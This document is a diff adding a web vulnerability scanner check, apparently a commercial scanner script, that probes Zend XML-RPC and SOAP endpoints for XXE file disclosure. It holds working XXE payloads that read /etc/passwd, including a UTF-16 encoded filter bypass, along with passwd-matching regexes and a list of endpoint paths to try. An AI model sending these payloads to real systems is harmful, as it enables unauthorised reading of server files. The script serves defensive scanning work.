@@ -1,0 +1,206 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+var lastJob = null;
+var found = false;
+    
+// **************************************************************************************							 
+function alert(uri)
+{	
+	var vxml = 'Zend_LFI_XXE.xml'; 
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(lastJob);
+	
+	AddReportItem(ri);	
+}
+/***********************************************************************************/
+function testZendLFIXXE(uri)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri;		
+	
+	lastJob.request.body = '<?xml version="1.0"?>' + CRLF() +
+		' <!DOCTYPE foo [  ' + CRLF() +
+		'  <!ELEMENT methodName ANY >' + CRLF() +
+		'  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>' + CRLF() +
+		'<methodCall>' + CRLF() +
+		'  <methodName>&xxe;</methodName>' + CRLF() +
+		'</methodCall>' + CRLF();
+	
+	lastJob.execute();
+    if (!lastJob.wasError) {
+        var match = /((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])/i.exec(lastJob.response.body);
+	    if(match) {
+            found = true;
+            alert(uri);
+        }
+    }
+		
+	// try again with an URL
+	if (!found) {		
+			
+		lastJob = new THTTPJob();
+		lastJob.verb = "POST";
+		lastJob.url  = scanURL;	
+		lastJob.uri  = uri;		
+		
+		lastJob.request.body = '<?xml version="1.0"?>' + CRLF() +
+			' <!DOCTYPE foo [  ' + CRLF() +
+			'  <!ELEMENT methodName ANY >' + CRLF() +
+			'  <!ENTITY xxe SYSTEM "http://testasp.vulnweb.com/t/fit.txt" >]>' + CRLF() +
+			'<methodCall>' + CRLF() +
+			'  <methodName>&xxe;</methodName>' + CRLF() +
+			'</methodCall>' + CRLF();
+		
+		lastJob.execute();
+		if (!lastJob.wasError) {
+				if (lastJob.response.body.indexOf("63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8") != -1)
+				{
+						found = true;
+						alert(uri);
+				}
+		}				
+	}    
+	// try again with a bad hostname
+	if (!found) {		
+			
+		lastJob = new THTTPJob();
+		lastJob.verb = "POST";
+		lastJob.url  = scanURL;	
+		lastJob.uri  = uri;
+		
+		lastJob.request.body = '<?xml version="1.0"?>' + CRLF() +
+			' <!DOCTYPE foo [  ' + CRLF() +
+			'  <!ELEMENT methodName ANY >' + CRLF() +
+			'  <!ENTITY xxe SYSTEM "http://somebadhostthatshouldnotresolve:22/" >]>' + CRLF() +
+			'<methodCall>' + CRLF() +
+			'  <methodName>&xxe;</methodName>' + CRLF() +
+			'</methodCall>' + CRLF();
+		
+		lastJob.execute();
+		if (!lastJob.wasError) {
+				if (
+                    (lastJob.response.body.indexOf("The remote name could not be resolved: 'somebadhostthatshouldnotresolve'") != -1) ||
+                    (lastJob.response.body.indexOf("failed to load external entity") != -1 && lastJob.response.body.indexOf("somebadhostthatshouldnotresolve") != -1)
+                    )
+				{
+						found = true;
+						alert(uri);
+				}
+		}				
+	}
+	// try again with the latest bypass
+	if (!found) {		
+		lastJob = new THTTPJob();
+		lastJob.verb = "POST";
+		lastJob.url  = scanURL;	
+		lastJob.uri  = uri;
+        lastJob.request.addHeader('Content-type', 'text/xml;charset=utf-16', true);
+		
+		lastJob.request.body = strFromRawData(0xFF, 0xFE, 0x3C, 0x00, 0x3F, 0x00, 0x78, 0x00, 0x6D, 0x00, 0x6C, 0x00,
+            0x20, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00,
+            0x6F, 0x00, 0x6E, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x31, 0x00, 0x2E, 0x00,
+            0x30, 0x00, 0x22, 0x00, 0x20, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x63, 0x00,
+            0x6F, 0x00, 0x64, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x3D, 0x00,
+            0x22, 0x00, 0x55, 0x00, 0x54, 0x00, 0x46, 0x00, 0x2D, 0x00, 0x31, 0x00,
+            0x36, 0x00, 0x22, 0x00, 0x3F, 0x00, 0x3E, 0x00, 0x0A, 0x00, 0x3C, 0x00,
+            0x21, 0x00, 0x44, 0x00, 0x4F, 0x00, 0x43, 0x00, 0x54, 0x00, 0x59, 0x00,
+            0x50, 0x00, 0x45, 0x00, 0x20, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x74, 0x00,
+            0x68, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x43, 0x00, 0x61, 0x00, 0x6C, 0x00,
+            0x6C, 0x00, 0x20, 0x00, 0x5B, 0x00, 0x0A, 0x00, 0x20, 0x00, 0x20, 0x00,
+            0x3C, 0x00, 0x21, 0x00, 0x45, 0x00, 0x4E, 0x00, 0x54, 0x00, 0x49, 0x00,
+            0x54, 0x00, 0x59, 0x00, 0x20, 0x00, 0x70, 0x00, 0x6F, 0x00, 0x63, 0x00,
+            0x64, 0x00, 0x61, 0x00, 0x74, 0x00, 0x61, 0x00, 0x20, 0x00, 0x53, 0x00,
+            0x59, 0x00, 0x53, 0x00, 0x54, 0x00, 0x45, 0x00, 0x4D, 0x00, 0x20, 0x00,
+            0x22, 0x00, 0x66, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3A, 0x00,
+            0x2F, 0x00, 0x2F, 0x00, 0x2F, 0x00, 0x65, 0x00, 0x74, 0x00, 0x63, 0x00,
+            0x2F, 0x00, 0x70, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 0x77, 0x00,
+            0x64, 0x00, 0x22, 0x00, 0x3E, 0x00, 0x0A, 0x00, 0x5D, 0x00, 0x3E, 0x00,
+            0x0A, 0x00, 0x3C, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x74, 0x00, 0x68, 0x00,
+            0x6F, 0x00, 0x64, 0x00, 0x43, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x6C, 0x00,
+            0x3E, 0x00, 0x0A, 0x00, 0x20, 0x00, 0x20, 0x00, 0x3C, 0x00, 0x6D, 0x00,
+            0x65, 0x00, 0x74, 0x00, 0x68, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x4E, 0x00,
+            0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x72, 0x00, 0x65, 0x00,
+            0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00,
+            0x64, 0x00, 0x3A, 0x00, 0x20, 0x00, 0x26, 0x00, 0x70, 0x00, 0x6F, 0x00,
+            0x63, 0x00, 0x64, 0x00, 0x61, 0x00, 0x74, 0x00, 0x61, 0x00, 0x3B, 0x00,
+            0x3C, 0x00, 0x2F, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x74, 0x00, 0x68, 0x00,
+            0x6F, 0x00, 0x64, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00,
+            0x3E, 0x00, 0x0A, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x6D, 0x00, 0x65, 0x00,
+            0x74, 0x00, 0x68, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x43, 0x00, 0x61, 0x00,
+            0x6C, 0x00, 0x6C, 0x00, 0x3E, 0x00, 0x0A, 0x00);
+		
+		lastJob.execute();
+        if (!lastJob.wasError) {
+            var match = /((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])/i.exec(lastJob.response.body);
+            if(match) {
+                found = true;
+                alert(uri);
+            }
+        }
+    }
+	
+	return found;
+}
+/***********************************************************************************/
+function findTargets(list)
+{	
+	for (var i=0;i<list.count; i++){			
+		var sf = list.getFile(i);		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile)
+		{
+            var fileName = getFileName(sf.name);
+	        var fileExt  = getFileExt(sf.name);
+            var fname = sf.name.toLowerCase();            
+            if (
+				   fname.indexOf("xml") != -1
+                || fname.indexOf("zend") != -1
+                || fname.indexOf("rpc") != -1
+                || fname.indexOf("api") != -1
+                )
+			{
+				dirs.push(sf.fullPath);
+                // don't test more than 100
+                if (dirs.length>100) break;
+			}
+        }
+	}
+}
+/***********************************************************************************/
+/* main entry point */
+var dirs = new Array();
+var siteRoot = getPathDirectory(scanURL.path);
+var list = getNewFiles(loadHttp);
+findTargets(list);
+found = false;
+if (dirs.length) 
+for (var i=0; i<dirs.length; i++)
+{
+	if (testZendLFIXXE(dirs[i])) found = true;
+}
+if (!found) {
+    var testedStatic = getGlobalValue("zendlfixxe-static");
+    if (!testedStatic)
+    {
+    	SetGlobalValue("zendlfixxe-static", 1, true);
+        
+		testZendLFIXXE(siteRoot + "/xmlrpc");
+        testZendLFIXXE(siteRoot + "/xmlrpc.php");
+        testZendLFIXXE(siteRoot + "/soap.php");
+        testZendLFIXXE(siteRoot + "/xmlrpc-server.php");
+        testZendLFIXXE(siteRoot + "/xmlrpc_server.php");
+        testZendLFIXXE(siteRoot + "/xmlrpc/server.php");
+		testZendLFIXXE(siteRoot + "/xmlrpc/soapserver.php");
+        testZendLFIXXE(siteRoot + "/xmlrpc/soap.php");
+        testZendLFIXXE(siteRoot + "/xmlrpc.asp");        
+        testZendLFIXXE(siteRoot + "/xmlrpc.jsp");
+        testZendLFIXXE(siteRoot + "/xmlrpc.aspx");        
+        testZendLFIXXE(siteRoot +  "/index.php/api/xmlrpc");        
+        testZendLFIXXE(siteRoot +  "/soapserver/");        
+    }
+}
